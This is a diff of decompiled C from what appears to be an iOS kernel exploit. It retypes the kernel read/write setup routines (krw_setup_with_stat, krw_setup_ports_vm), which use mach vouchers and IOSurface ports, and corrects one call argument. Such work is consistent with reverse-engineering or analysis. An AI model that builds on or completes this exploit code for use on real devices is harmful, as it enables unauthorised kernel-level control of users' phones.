@@ -284,8 +284,8 @@ __int64 __fastcall iosurface_id_to_index(unsigned int);
 __int64 __fastcall get_iosurface_mem_entry(__int64 a1, unsigned int a2, mach_port_name_t *a3);
 __int64 __fastcall alloc_vm_page_mem_entry(__int64 a1, unsigned int a2, vm_size_t size, vm_address_t *address);
 __int64 __fastcall alloc_vm_page(__int64 a1);
-__int64 __fastcall krw_setup_with_stat(__int64 a1, int *a2);
-__int64 __fastcall krw_setup_ports_vm(__int64 a1, int *a2);
+bool __fastcall krw_setup_with_stat(__int64 a1, int *a2);
+bool __fastcall krw_setup_ports_vm(__int64 a1, int *a2);
 __int64 __fastcall setup_voucher_exploit_ctx(struct_krwCtx *a1, unsigned int *a2, unsigned int a3);
 __int64 __fastcall alloc_iosurface_mach_port(struct_krwCtx *a1, unsigned int a2, unsigned int a3);
 __int64 __fastcall insert_mach_port_send_right(__int64 a1, task_name_t a2, unsigned int a3, __int64 a4, unsigned int a5);
@@ -18027,7 +18027,7 @@ __int64 __fastcall alloc_vm_page(__int64 a1)
 }
 
 //----- (000000000001C0C8) ----------------------------------------------------
-__int64 __fastcall krw_setup_with_stat(__int64 a1, int *a2)
+bool __fastcall krw_setup_with_stat(__int64 a1, int *a2)
 {
   unsigned __int64 v4; // x8
   __int64 v5; // x24
@@ -18154,15 +18154,15 @@ LABEL_13:
     v11 = 1;
   }
   *a2 = v11;
-  return 1;
+  return true;
 }
 
 //----- (000000000001C3EC) ----------------------------------------------------
-__int64 __fastcall krw_setup_ports_vm(__int64 a1, int *a2)
+bool __fastcall krw_setup_ports_vm(__int64 a1, int *a2)
 {
   vm_size_t v4; // x20
   int v5; // w8
-  __int64 result; // x0
+  bool result; // w0
   __int64 v7; // x24
   ipc_voucher_t *v8; // x22
   mach_port_name_t *v9; // x0
@@ -18193,7 +18193,7 @@ __int64 __fastcall krw_setup_ports_vm(__int64 a1, int *a2)
   v24 = 0;
   v23 = -1;
   v5 = fd_open_dev_null(&v23);
-  result = 0;
+  result = false;
   if ( !v5 )
   {
     v7 = -3;
@@ -18202,15 +18202,15 @@ __int64 __fastcall krw_setup_ports_vm(__int64 a1, int *a2)
     {
       if ( *(uint64_t *)(a1 + 344) < XNU_VERSION_PACKED(8020, 241, 8, 0, 0) )
       {
-        result = voucher_create_mach_voucher(a1, v7 + 0x312233445566778BLL, v8);
-        if ( !(uint32_t)result )
+        result = voucher_create_mach_voucher(a1, v7 + 0x312233445566778BLL, v8) != 0;
+        if ( !result )
           break;
         if ( *v8 + 1 < 2 )
           goto LABEL_16;
       }
       else
       {
-        v9 = (mach_port_name_t *)iosurface_enum_mach_port(result, (int)v7 + 3);
+        v9 = (mach_port_name_t *)iosurface_enum_mach_port(a1, (int)v7 + 3);
         if ( !v9 )
           goto LABEL_16;
         v10 = *v9;
@@ -18287,7 +18287,7 @@ LABEL_24:
     if ( !v14 )
       vm_deallocate(mach_task_self_, v24, v4);
     *a2 = v13;
-    return 1;
+    return true;
   }
   return result;
 }
